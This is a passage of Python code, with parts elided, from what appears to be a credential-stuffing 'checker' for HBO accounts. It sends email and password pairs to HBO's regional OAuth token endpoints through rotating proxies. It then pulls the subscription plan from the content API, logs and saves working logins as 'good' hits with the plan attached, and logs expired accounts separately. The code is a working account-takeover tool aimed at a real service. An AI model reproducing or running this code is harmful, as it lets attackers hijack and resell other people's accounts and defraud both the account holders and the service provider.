    ...
    while not Checker.stopping:
        try:
            with Session() as s:
                ...
                r = s.post(
                    "https://oauth.api.hbo.com/auth/tokens",
                    json=payload,
                    headers=headers,
                )
                ...
                r = s.post(
                    "https://oauth-us.api.hbo.com/auth/tokens",
                    json=payload,
                    headers=headers,
                )
                if "geo_blocked" in r.text:
                ...
                r = s.post(
                    "https://oauth-emea.api.hbo.com/auth/tokens",
                    json=payload,
                    headers=headers,
                )
                ...
                r = s.post(
                    "https://user-comet-emea.api.hbo.com/content",
                    json=payload,
                    headers=headers,
                )
                if "expired" in r.text:
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "HBO")
                ...
                plan = (
                    r.json()[0]["body"]["billingInformationMessage"]
                    .split("Current Plan: ")[1]
                    .split("]")[0]
                    .replace("[", "")
                )
                if not Checker.cui:
                    log("good", ":".join([email, password]), "HBO")
                save(
                    "HBO",
                    "good",
                    Checker.time,
                    ":".join([email, password]) + f" Plan: {plan}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
